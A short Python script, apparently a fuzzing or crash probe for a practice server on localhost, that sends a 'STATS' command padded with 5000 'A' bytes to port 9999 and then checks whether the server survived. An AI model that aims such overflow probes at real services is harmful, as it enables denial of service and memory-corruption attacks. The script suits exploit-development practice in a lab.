import socket
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9999))
s.recv(1024)
s.send(b"STATS /.:/ " + b"A" * 5000 + b"\r\n")
s.close()
print("Done — server still running?")
